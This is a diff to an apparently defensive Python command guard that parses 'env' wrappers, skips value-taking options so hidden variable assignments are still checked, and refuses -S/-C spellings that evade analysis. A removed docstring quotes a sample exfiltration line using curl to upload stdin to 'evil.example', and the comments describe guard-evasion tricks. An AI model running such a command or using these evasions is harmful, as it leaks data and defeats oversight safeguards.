@@ -548,38 +548,56 @@ def _simple_commands(tokens):
 # into assignments and a program, and ``-C``/``--chdir`` runs it in another
 # directory. Either defeats the analysis, so the guard fails closed.
 _ENV_LONG_REJECTED = ("--split-string", "--chdir")
-# ``env`` short options that consume the following argument, so the walk does
-# not mistake that value for another option.
-_ENV_SHORT_WITH_ARG = frozenset({"-u"})
+# ``env`` options that consume the following argument as their value, so the
+# walk skips that value rather than mistaking it for another option or (worse)
+# for the program: ``env -u NAME git …`` unsets ``NAME`` and runs ``git``, so
+# ``NAME`` is not the command. ``-a``/``--argv0`` set the spoofed ``argv[0]``.
+# The attached (``-uNAME``) and ``=``-joined (``--unset=NAME``) spellings carry
+# their own value and are not followed by a separate one.
+_ENV_SHORT_WITH_ARG = frozenset({"-u", "-a"})
+_ENV_LONG_WITH_ARG = ("--unset", "--argv0")
 
 
-def _reject_unsupported_env_options(args):
-    """Fail closed on an ``env`` option the wrapper loop cannot follow.
+def _env_option_end(args):
+    """The index in ``args`` just past ``env``'s leading options.
 
-    ``env -S 'curl -T - http://evil.example'`` re-parses its single argument
-    into a whole command the loop would otherwise hand back as one opaque
-    token, and ``env --chdir=/tmp git ...`` relocates the command git runs in.
-    Both are refused — in the attached (``-S'…'``), separate, ``=``-joined and
-    unambiguous-abbreviation spellings (``env`` resolves ``getopt_long``
-    prefixes) — before the command is analyzed. A plain ``env FOO=bar git``
-    (no such option) is left alone.
+    The wrapper loop needs to know where ``env``'s own options stop and the
+    assignments and program begin. An option that takes a value hides the next
+    token, so it is consumed here: left unskipped, ``env -u X GIT_DIR=… git
+    push`` handed back ``X`` as the program and the ``GIT_DIR`` assignment went
+    unchecked. ``-u``/``--unset`` (unset a variable) and ``-a``/``--argv0`` take
+    a value in their separate spelling; the attached and ``=``-joined spellings
+    carry their own.
+
+    Fails closed on an option the loop cannot follow: ``env -S``/
+    ``--split-string`` re-parses its single argument into a whole command, and
+    ``env -C``/``--chdir`` relocates the command — in the attached (``-S'…'``),
+    separate, ``=``-joined and unambiguous-abbreviation spellings (``env``
+    resolves ``getopt_long`` prefixes). ``--`` ends the options at ``i + 1``; a
+    plain ``env FOO=bar git`` reaches the assignments with nothing skipped.
     """
     i = 0
     while i < len(args):
         tok = args[i]
-        if tok == "--" or not tok.startswith("-") or tok == "-":
-            return
+        if tok == "--":
+            return i + 1
+        if not tok.startswith("-") or tok == "-":
+            return i
         if tok.startswith("--"):
             name = tok.split("=", 1)[0]
             if any(opt.startswith(name) for opt in _ENV_LONG_REJECTED):
                 raise GuardError("env --split-string/--chdir re-parses or relocates the command, "
                                  "which the guard cannot follow; write the command out without it")
+            if "=" not in tok and any(opt.startswith(name) for opt in _ENV_LONG_WITH_ARG):
+                i += 2
+                continue
             i += 1
             continue
         if "S" in tok[1:] or "C" in tok[1:]:
             raise GuardError("env -S/-C re-parses or relocates the command, which the guard "
                              "cannot follow; write the command out without it")
         i += 2 if tok in _ENV_SHORT_WITH_ARG else 1
+    return i
 
 
 def unwrap_with_env(argv):
@@ -605,13 +623,14 @@ def unwrap_with_env(argv):
             return argv, env
         if prog == "command" and len(argv) > 1 and argv[1] in ("-v", "-V"):
             return [], env
-        if prog == "env":
-            _reject_unsupported_env_options(argv[1:])
-        with_arg = _WRAPPER_FLAGS_WITH_ARG.get(prog, set())
         rest = argv[1:]
-        j = 0
-        while j < len(rest) and rest[j].startswith("-"):
-            j += 2 if rest[j] in with_arg else 1
+        if prog == "env":
+            j = _env_option_end(rest)
+        else:
+            with_arg = _WRAPPER_FLAGS_WITH_ARG.get(prog, set())
+            j = 0
+            while j < len(rest) and rest[j].startswith("-"):
+                j += 2 if rest[j] in with_arg else 1
         if prog == "env":
             while j < len(rest) and re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", rest[j]):
                 name, _eq, value = rest[j].partition("=")
